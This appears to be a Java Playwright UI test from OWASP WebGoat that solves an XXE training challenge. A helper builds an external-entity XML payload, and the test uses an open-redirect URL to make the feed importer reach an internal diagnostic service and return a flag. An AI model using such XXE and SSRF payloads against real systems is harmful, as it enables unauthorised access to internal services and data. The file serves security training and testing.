/*
 * SPDX-FileCopyrightText: Copyright © 2026 WebGoat authors
 * SPDX-License-Identifier: GPL-2.0-or-later
 */
package org.owasp.webgoat.playwright.webgoat.lessons;

import static com.microsoft.playwright.assertions.PlaywrightAssertions.assertThat;

import com.microsoft.playwright.Browser;
import com.microsoft.playwright.Page.GetByRoleOptions;
import com.microsoft.playwright.options.AriaRole;
import java.util.regex.Pattern;
import org.junit.jupiter.api.Test;
import org.owasp.webgoat.container.lessons.LessonName;
import org.owasp.webgoat.playwright.webgoat.PlaywrightTest;
import org.owasp.webgoat.playwright.webgoat.helpers.Authentication;
import org.owasp.webgoat.playwright.webgoat.pages.lessons.LessonPage;

public class Challenge2UITest extends PlaywrightTest {

  @Test
  void recoverAndSubmitTheFlagThroughTheFeedImporter(Browser browser) {
    var page = Authentication.sylvester(browser);
    var lessonPage = new LessonPage(page);
    var lessonName = new LessonName("Challenge2");
    lessonPage.resetLesson(lessonName);
    lessonPage.open(lessonName);

    assertThat(page.locator(".partner-feed-dashboard h3")).hasText("Partner feed recovery");

    var preview = page.locator("#partner-feed-preview");
    var previewButton = page.getByRole(AriaRole.BUTTON, new GetByRoleOptions().setName("Preview feed"));
    var submitButton = page.getByRole(AriaRole.BUTTON, new GetByRoleOptions().setName("Submit result"));
    previewButton.click();
    assertThat(preview).hasText("Evening bulletin");

    page.locator("#partner-feed-xml")
        .fill(entityFeed(page.locator("#partner-feed-diagnostic-link").getAttribute("href")));
    previewButton.click();
    assertThat(preview).hasText("XML could not be processed within this lesson");

    page.locator("#partner-feed-xml").fill(entityFeed("go?url=internal%2Fdiagnostics"));
    previewButton.click();
    assertThat(preview)
        .hasText(Pattern.compile("[0-9a-f]{8}(?:-[0-9a-f]{4}){3}-[0-9a-f]{12}"));
    String flag = preview.textContent().strip();

    page.locator("#partner-feed-result").fill("wrong-result");
    submitButton.click();
    assertThat(page.locator(".partner-feed-submit .attack-feedback"))
        .containsText("That result is not linked to a completed import in this session.");

    page.locator("#partner-feed-result").fill(flag);
    submitButton.click();
    assertThat(page.locator(".partner-feed-submit .attack-feedback"))
        .containsText("Result accepted. The feed importer reached the diagnostic service");
    assertThat(page.locator(".partner-feed-submit .assignment-success i")).isVisible();
  }

  private String entityFeed(String url) {
    return "<!DOCTYPE feed [<!ENTITY flag SYSTEM \"" + url + "\">]><feed>&flag;</feed>";
  }
}
